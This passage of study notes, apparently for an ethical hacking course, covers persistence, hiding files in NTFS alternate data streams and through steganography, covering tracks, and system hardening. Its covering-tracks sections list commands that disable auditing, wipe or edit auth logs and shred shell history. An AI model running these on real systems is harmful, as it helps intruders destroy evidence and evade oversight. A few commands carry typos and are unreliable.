	- Windows Manage User Level Persistent Payload Installer
	- Windows Persistent Registry Startup Payload Installer
	- Windows Persistent Service Installer
	- Persistent Payload in Windows Volume Shadow Copy
- GitHub lists 33 post exploitation persistence repositories
	- Example:harleyQu1nn/AggressorScripts/tree/master/Persistence

#### 6.20 HIDING DATA

#### HIDING FILES
- If you want to ensure that files you leave behind are not visible, you can use various methods to hide them:
	- File attributes 
	- Alternate Data streams
	- Steganography
	- Third-party rootkits, drivers and DLLs to hide files and processess

#### HIDING FILES AND FOLDERS USING FILE ATTRIBUTES
- In Windows: attrib +h filename
	- attrib +h hideme.txt
- Hide a folder, including all files and subfolders inside
	- attrib +h hidethisfolder /s /d
- In Linux, add a. to the beginning of the filename
	- bad.text .bad.text

ALTERANTE DATA STREAMS
- AKA ADS or NTFS Steams
- In Windows, you can use ADS to hide files
- ADS is a feature of NTFS
	- Created to make Windows compatible with the MAC file system
	- You can use it to hide files
- The hidden file is a "Stream" of another (primary) file
- You can see the primary file in the GUI or at a command prompt
- Any Streams connected to the primary file are hidden
- Streams do add to the overall size of the primary file
- The basic syntax to create a stream on a primary file is
	- filename.ext:stream

#### ADS EXAMPLE
- FAT File
	- File.ext (i) Attributes (ii) Data
- NTFS 
	- (i) Attributes (ii) Main Stream (iii)Alternate Steam (IV) Alternate Stream (V) Alternate Stream


#### HOW TO LIST ADS FOR A FILE
- Command Prompt
	- `dir /R filename`
- PowerShell:
	- `Get-Item filename -Steam *`
- Read ADS contents in windows 10:
	- `more < "filename:stream name"
	- `Get-Content "filename" -Stream "stream name"`

#### CREATE AN ADS
- Create a simple text file
	- echo Hello World ! > hello.txt
- Create an alternate stream for hello.txt called "test"
	- echo Testing NTFS streams > hello.txt:test
- Open the text file normally. You only see the content "Hello World!"
- View the stream content. You should see the alt content "Testing NTFS streams" 
	- `notepad hello.txt:test`

#### HIDE AN EXECUTABLE IN AN ADS
Hide notepad.exe is an ADS file called hidden.exe
Attach it to the text file hello.txt
`c:\> type c:\windows\notepad.exe > hello.txt:hidden.exe`


- ##### DEFEND AGAINST NTFS STREAMS
- Move suspected files to a FAT partition or email them as attachments
- Use file integrity checkers like Tripwire or md5sum to verify the file hasn't changed
- dir /R will show streams from SystemInternals
- You can use FTK (forensics Toolkit) to look for this


#### STREAM DETECTOR TOOLS
- Systeminternal streams
- Eventsentry
- Lads
- adslist.exe
- StreamDetector
- ADS Detector
- Stream Armor
- Forensic Toolkit
- ADS Spy
- ADS Manager
- ADS Scanner



#### STEGANOGRAPHY
The art and science of hiding information by embedding messsages within other, seemingly harmless messages
It works by replacing bits of useless or unwused data in regular computer files with bits of different invisible information
Data can be anything
	Text
	Image
	Media file
	Encrypted / not encrypted
Carrier files appear perfectly normal. You can read and play them
Hidden data travels with the file
Requires knowledge of which file is the host and how to retrieve the hidden data

#### STEGANOGRAPHY TYPES
- Image Steganography:-
	- Images are the popular cover objects used for steganography
	- In Image steganography the uses hides the information in image files of different formats such as .png, .jpg, .bmp, etc	
- Document Steganography
	- In the document steganography user adds white space and tabs at the end of the lines 
- Folder Steganography
	- Folder steganography refers to hiding one or more files in a folder
	- In this process, use moves the file physically but keeps the associated files in its original folder for recovery
- Video Steganography
	- Video steganography is a technique to hide fiels with any extension into a carrying video file
	- One can apply video steganography to different format of files such as .avi, ,mpg4, .wmv, etc.
- Audio Steganography
	- In audio steganography user embeds the hidden messages in digital sound format
- Whitespace steganography
	- In the white space steganography, user hides the messages in ASCII text by adding white spaces to the end of the lines
- Web Steganography
	- In the web steganography, user hides web objects behind objects and uploads them to a webserver
- Spam/Email Steganography
	- One can use spam emails for secreat communication by embedding the secreat messages in some way and hinding the embedded data in the spam emails
	- This technique refers to spam email steganography
- DVD ROM Steganography
	- attacker embeds the content in audio or graphical mode
- Natural Text Steganography
	- attacker converts the sensitive information into a user-definable free speech such as a play.
- Hidden OS steganography:
	- attacker hides one operating System into other
- C++ source code Steganography
	- User hides a set of tools in the files
> At a very high scale level, steganography is used by terrorist to issue commands to their followers on websites even in broad daylight



#### STEGANOGRAPHY TOOLS
- XIAO STEGANOGRAPHY
- Image Steganography
- Steghide
- Crypture
- Steganographx Plux 2.0
- rSteg
- SSuite Picsel
- Our Secret
- Camouflage
- OpenStego
- SteganPEG
- Hide n Send
- SNOW
- QuickStego
- ImageHide
- GIFShuffle


#### DETECTING STEGANOGRAPHY
- Good Detection requires the original (uncompromised) file
- Text files
	- Unusual patterns
	- Appended extra spaces and invisible characters
- Image files
	- Too many distortions in image
	- Image quality degraded
	- Compare original and stego image with respect to color composition, luminance, pixel relationships
	- Scan least significant bits (LSBs) for hidden data
- Audio Files
	- Scan inaudibles frequencies and LSBs for hidden data
- Use image and audio techniques

#### STEGANOGRAPHY DETECTION TOOLS
Gargoyle Investigator forensic Pro
StegSecret
StegAlyzer
Steganography Studio
Virtual Steganographic laboratory (VSL)
Stegdetect


#### ADDITIONAL FILE HIDING METHODS
- Unexpected locations
	- Hide files in places like the recycle bin, or system32 folder
- Function modification
	- Replace file reporting tools such as file explorer, dir and ls with malicious versions
- Function hooking
	- Use a rootkit to intercept low-level calls (such as listing files) to the operating system kernel 
	- Any lists of files and folders returned to the calling application will not include the hidden objects
	- File-hinding tools ecamples:
		- Wise folder hider
		- Vovsoft
		- Gilisoft
		- Winmend
	- GitHub (131) repos

### 6.21 COVERING TRACKS
- Your Primary task will be to clear/modify /falsify logs
- Also remove any files/ artifacts that could be discovered
- Clear registry entries and command line history
- Windows `(Even viewer logs)`
	- There are either System , Application or Security logs
	- logs are XML format with .evtx extension. Stored in `%systemroot%\winevt\logs`. Note prior to Window 7 / server 2008, evt files were binary and stored as *.evt*
	- Event found in `system` and `application` logs would be Information/Warning/Error
		- Information: lets you know that an application, service or driver completed an operation
		- Warning: informs you of a situation that is probably significant, but not yet a serious problems, for example , low disk space will trigger a warning event
		- Error: Indicates a serious problem that may cause a loss of functionality or loss of data.
	- Event found in `security` logs
		- SuccessAudit
			- Records a successful event that is audited for security purposes
			- For example , when a user successfully logs on to the system, a success audit event is recorded
		- Failure Audit
			- Records an unsuccessful event that is audited for security purposes
			- For example, when a user unsuccessfully tries to log on to the system, failure audit event is recorded
>Note: Audit logging can also be enabled for file, print, and Active Directory access
>	Security logging has to be enabled in group policy
>	Logging then has to be enabled for a specific object in its security tabs
- Linux `/var/log/messages`

#### HIDING NETWORK ACTIVITY

- Use reverse HTTP shells
	- Victim starts HTTP session to attacker
	- This looks normal
- Use reverse ICMP tunnels
	- Victim ping out past firewalls with payloads in ICMP data
- Use DNS tunneling
	- Hide data inside DNS queries/replies
- Use TCP covert channels
	- IP ID field
	- TCP ack#
	- TCP initial sequence

#### CLEARING ONLINE/BROWSER TRACKS
- User private browsing
- Delete browsing history
- Disable stored history
- delete private data
- Clear cookies on exit
- Clear data in password manager
- Delete saved sessions
- Delete user javaScript
- Clear cache on exit
- Delete downloads
- Disable password manager
- Clear toolbar data
- Turn off autoComplete
- Use multiple user accounts
- Remove most recently used (MRU)
- Turn of most used apps and recently opened items


#### CLEARING THE EVENT LOG

- Disable auditing ahead of time to prevent logs from being captured
- Delete the entries pertaining to your actions
- Corrupt log file and make it unreadable
- Tools to clear Event logs
	- Ccleaner : Automate system cleaning, scrub online history , log files ,etc
	- Eventlogedit-evtx-evolution: Remove individual lines from EVTX files, useful for window 7 or server 2012 or later
	- Metasploit clearev 

##### CHANGING EVENT LOG SETTINGS
#Auditpol
```
auditpol \\TargetIP /disable

\\ display all audit policies in details if is enable (Object Access, System, Logon/logoff Previlege Use and so on)
auditpol /get /category:* 

\\ Reset (Disable) the sytem audit policy for all subcategories
auditpo /Clear 


\\ Remove all per-user audit policy settings and disables all system audit policy settings
auditpol /remove

```

#### CLEARING MRU AND COMMAND HISTORY
- Detect and clean MRU (most recently used ) lists on your computer
	- MRU lists contain information such as the names and /or locations of the last files you have accessed
	- They are located all over the registery for almost any file type
	- MRUblaster - https://www.brightfort.com/mrublaster.html
- Clear out command line history
	- CMD prompt: Press [alt] + [f7]
	- Powershell : type clear-history
- Additional Tools to cover tracks in Windows
	- Clear_Event_Viewer_logs.bat
	- Free Internet Windows Washer
	- DBAN
	- Blancco Drive Eraser
	- Privacy Eraser
	- Wipe
	- BleachBit
	- ClearProg
	- ClearMyHistory

#### COMMON LINUX LOGS
- On linux messages are saved at 
	- General Messages` /var/log/messages` or 
	- System Messages  `/var/log/syslog/`
	- Authentication logs: `/var/log/auth.log or /var/log/secure` for successful or failed logins and authentication methods
	- Boot logs: `/var/log/boot.log` for any messages logged during startup
	- mail server `/var/log/maillog or /var/log/mail.log` for logs related to mail servers


#### CLEARING LINUX LOGS
```
\\ It is possible to echo whitespace to clear the event log file:
	echo " " > /var/log/auth.log
\\using 'black hole dev/null'
	echo /dev/null > auth.log
\\ To tamper/ modify the log files, you can use sed stream editor to delete , replace and insert data.

\\ delete specific lines. Example: delete lines from file having word 'opened'
	sed -i '/opened/d' /var/log/auth.log

\\ Use hidden files
	name a malicious file. ".log" with space between and log then hide in /dev or /tmp

```


#### DISABLEING or CLEARING BASH SHELL HISTORY
```
export  HISTSIZE = 0 (disable the history)

\\ clear stored history
history -c 

\\ clear stored history for current shell
history -w 


\\ Shred or completed delete evidence
shred -zu ~/.bash_history
shred ~/.bash_history && cat /dev/null > .bash_history && history  -c && exit

\\ Force deletion of bash_history file
	rm -rf ~/.bash_history

```

Open .zsh_history from /home/USER and delete all lines in the text files and save the file

#### 6.22 SYSTEMS HACKING COUNTER MEASURES

#### Defend against System Hacking
- Employ a multilayer , holistic security plan
- Protect:
	- Systems
	- Apps
	- Data
	- Infrastructure
	- Processes
	- Personnel
- Utilize
	- Policies, procedures and training
	- Network security
	- Physical security
	- Change Management
	- Risk Management
	- Auditing
	- Disaster recovery
	- 


#### General System Defense
- Change defaults
- Disable unused accounts ,features and services
- Regularly patch and update the OS, services and applications
- Regularly verify system file integrity
- Set permissions and rights based on the principle of least privilege
- Use VPNs to connect
- Deploy Intrusion Detection on the network
- Deploy edge and host firewalls

#### PASSWORD CRACKING COUNTERMEASURES
- Set a password policy including history, length, complexity and minimum/ maximum age
- Do not use passwords such as date of birth, spouse / child / pet's name
- Monitor for local and network-based dictionary/ brute-forcing
- Prefer long pass phrases over shorter complex passwords
- Prefer two-factor authentication if possible
- Enable SYSKEY or BitLocker on Windows to protect the SAM databases
- Avoid clear text protocols
- Avoid storing passwords in an unsecure location
- Employ two-factor authentication such as:
	- Smart card + PIN
	- Biometrics and Password
- When using counter-based authentication, ensure that:
	- The hardware token or app regularly changes a one-times passcode
	- often used in conjunction with a password or PIN

#### RAINBOW TABLE COUNTERMEASURES
- Salting and key stretching make rainbow tables much less effective
	- These methods add random data to make a key longer
	- The cracking is a lot harder because the key is now longer
	- And it's hard to then tell which part is the salt and which part is the actual password
- Use multifactor authentication

#### PRIVILEGE ESCALATION COUNTERMEASURES

- Restrict interactive login privileges
- Encrypt sensitive data
- Assign least privilege to users and applications
- Assign standard accounts to service when possible
- Vulnerability scan, fuzz, and stress test applications
- Patch and update the kernel, web server, and other services regularly
- Change 'UAC' settings to "Always Notify"
- Use fully qualified, quoted paths in all windows applications
- Ensure executables are placed in write-protected directories
- In macOS, make plist files read-only.
- Disallow system utilities or software from scheduling tasks
- Disable the default local administrator account

#### HARDEN WINDOWS
- Configure Windows to only allow the installation of approved application from controlled software repositories
- Create from scratch a whitelist of files that are allowed to execute on end-user machines
	- Specify executables, libraries, scripts  and installers that are allowed to execute.
- Disable Remote Access
- Do not use PowerShell 2.0 or earlier
- Enable Auto-Updates
- Enable File Backups
- Install a host-based IDS
- Disable unnecessary services
- Install a good antivirus program and keep it updated
- Change all defaults
- Set a good password policy
- Prefer multi-factor authentication
- Set the screen to lock after inactivity
- Configure Windows Firewall
	- Restrict both outbound and inbound ports
- Use principle of least privilege when setting permission on resources

#### BUILT-IN WINDOWS DEFENDER TOOLS
Exploit Guard
Device Guard
Application Guard
Credential Guard
SmartScreen
Windows Hello
Windows Sandbox
Secure Boot
BitLocker


#### DEFEND AGAINST LLMNR / NBT-NS POISINING
- Configure group policy to disable LLMNR & NBT-NS
- Group policy Editor --> Local computer Policy --> Computer Configuration --> Administrative Templates --> Network --> DNS Client --> Turn off multicase name resolution
- Control Panel --> Network and Internet --> Network and sharing Center --> Change Adapter Settings --> Properties --> TCP/IPv4 --> General --> WINS --> Disable NetBIOS over TCP/IP


#### HARDEN LINUX
- Install security updates and patches
- Use strong passwords
- Prefer MFA
- Implements a firewall
- Delete unused packages
- Bind processes to localhost 127.0.0.1
	- Not All services have to be available via the  network
	- For example, when running a local instance of MySQL on your web server, let it only listen on a local socket or bind to localhost
	- Then configure your application to connect via this local address, which is typically already the default.
- Clean up old home directories and remove the users
- Security configurations
	- Read the man pages for each application for guidance on secure configuration
- Use disk encryption when possible
- Use the principle of least privilege to limit System and resource access.
- Monitor the system
	- Implement normal system monitoring and implement monitoring on security events
- Create backups (all test)
- Perform system auditing
	- Use a security tool like Lynis to perform a regular audit of your system


### 6.23 SYSTEM HACKING REVIEW p923

#### SYSTEM HACKING REVIEW
- There are many tools and approaches your can use to hack a system
- When hacking system services, prefer buffer overflows that allow remote privilege execution
- Use a compromised host to pivot into the rest of the internal network
- If you can only compromise a system at a standard user level, seek to escalate privilege 
- Maintain control through a persistent payload
- There are many tools and approaches you can use to hack system
- When hacking system services, prefer buffer overflows that allows privileged remote execution.
- Use a compromised host to pivot into the rest of the internal network
- Maintain control through a persistent payload
- If you exhaust your password cracking dictionary try brute forcing,, MITM or social engineering to get the password
- Use NTFS Streams or steganography to hide files and data
- Don't forget to cover your tracks
- When you are through, restore all systems, clean out all artifacts and documents your finding

